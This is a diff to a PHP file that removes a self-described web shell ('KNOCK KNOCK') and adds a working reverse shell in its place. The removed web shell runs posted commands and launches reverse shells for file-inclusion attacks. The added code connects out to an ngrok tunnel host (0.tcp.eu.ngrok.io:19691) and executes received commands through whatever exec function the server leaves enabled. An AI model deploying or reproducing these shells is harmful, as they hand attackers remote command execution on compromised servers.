@@ -1,66 +1,109 @@
-<?php 
-/*
-	Name : KNOCK KNOCK
-	Owner : Naman Sahore
-	Email : namansahore@gmail.com 
-	Published on : 30th July 2017
+    /*<?php /**/
+      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
+      $dis=@ini_get('disable_functions');
+      if(!empty($dis)){
+        $dis=preg_replace('/[, ]+/',',',$dis);
+        $dis=explode(',',$dis);
+        $dis=array_map('trim',$dis);
+      }else{
+        $dis=array();
+      }
+      
+    $ipaddr='0.tcp.eu.ngrok.io';
+    $port=19691;
 
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-
-	This shell scrpit can be used for performing Remote File Inclusion
-	as well as Local File Inclusion( by adding .php at the end of
-	script) and getting REVERSE SHELL from vulnerable server
-	or performing shell command on browser.
-
-	HOW TO USE:
-	FOR RFI
-		Clear .txt extention and upload the script on a server and 
-		preform RFI.
-	FOR LFI
-		Clear .txt and add .php extention to the script and
-		perform LFI by uploading shell script on a
-		vulnerable server.
-
-		Comment for more information.
-*/
-?>
-<body style="background-color:rgb(200,200,200);">
-	<form action="<?php $link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; echo "{$link}"?>" method="POST">
-	<center>
-		<strong>
-		</br>
-		<h1 color="rgb(255, 0, 31)"><b>KNOCK KNOCK</b></h1>
-		</br>
-		<h2 color="rgb(255, 0, 31)"><b>SHELL</b></h2>
-			COMMAND : <input type="text" name="cmd" value=""/>
-			<input type="submit" name="submit" value="CMD" />
-		</br></br>
-		<h2 color="rgb(255, 0, 31)"><b>R SHELL USING PHP</b></h2>
-		<p><b><i>*NOTE : </b>Before triggring rshell, start listening</i></p>
-		</br>
-		IP : <input type="text" name="ip" value=""/>&nbsp;PORT : <input type="text" name="port" value=""/>
-		<input type="submit" name="submit" value="R SHELL" />
-		</strong>
-	</center>
-	<br />
-	<strong>
-	<font size="5"> 
-		<?php
-		if(isset($_POST["cmd"])){
-			$cmd=$_POST["cmd"];
-			$output = system("{$cmd} 2>&1");
-			echo $cmd."</br>"."<pre>".$output."</pre>";
-		}
-		if (isset($_POST["ip"]) && isset($_POST["port"])) {
-			$sock="sock";
-			$cmd = "php -r '$"."{$sock}"."=fsockopen("."\"{$_POST["ip"]}\"".","."{$_POST["port"]}".");system(\""."/bin/sh -i <&3 >&3 2>&3"."\");'";
-			if (strlen($cmd)>66) {
-				system("{$cmd} 2>&1");
-			}
-		}
-		?>
-	</font>
-	</strong>
-</body>
+    if(!function_exists('SacRbumkX')){
+      function SacRbumkX($c){
+        global $dis;
+        
+      if (FALSE !== stristr(PHP_OS, 'win' )) {
+        $c=$c." 2>&1\n";
+      }
+      $wggc='is_callable';
+      $RLKVk='in_array';
+      
+      if($wggc('popen')&&!$RLKVk('popen',$dis)){
+        $fp=popen($c,'r');
+        $o=NULL;
+        if(is_resource($fp)){
+          while(!feof($fp)){
+            $o.=fread($fp,1024);
+          }
+        }
+        @pclose($fp);
+      }else
+      if($wggc('passthru')&&!$RLKVk('passthru',$dis)){
+        ob_start();
+        passthru($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($wggc('system')&&!$RLKVk('system',$dis)){
+        ob_start();
+        system($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($wggc('proc_open')&&!$RLKVk('proc_open',$dis)){
+        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
+        $o=NULL;
+        while(!feof($pipes[1])){
+          $o.=fread($pipes[1],1024);
+        }
+        @proc_close($handle);
+      }else
+      if($wggc('shell_exec')&&!$RLKVk('shell_exec',$dis)){
+        $o=`$c`;
+      }else
+      if($wggc('exec')&&!$RLKVk('exec',$dis)){
+        $o=array();
+        exec($c,$o);
+        $o=join(chr(10),$o).chr(10);
+      }else
+      {
+        $o=0;
+      }
+    
+        return $o;
+      }
+    }
+    $nofuncs='no exec functions';
+    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
+      $s=@fsockopen("tcp://0.tcp.eu.ngrok.io",$port);
+      while($c=fread($s,2048)){
+        $out = '';
+        if(substr($c,0,3) == 'cd '){
+          chdir(substr($c,3,-1));
+        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+          break;
+        }else{
+          $out=SacRbumkX(substr($c,0,-1));
+          if($out===false){
+            fwrite($s,$nofuncs);
+            break;
+          }
+        }
+        fwrite($s,$out);
+      }
+      fclose($s);
+    }else{
+      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+      @socket_connect($s,$ipaddr,$port);
+      @socket_write($s,"socket_create");
+      while($c=@socket_read($s,2048)){
+        $out = '';
+        if(substr($c,0,3) == 'cd '){
+          chdir(substr($c,3,-1));
+        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+          break;
+        }else{
+          $out=SacRbumkX(substr($c,0,-1));
+          if($out===false){
+            @socket_write($s,$nofuncs);
+            break;
+          }
+        }
+        @socket_write($s,$out,strlen($out));
+      }
+      @socket_close($s);
+    }
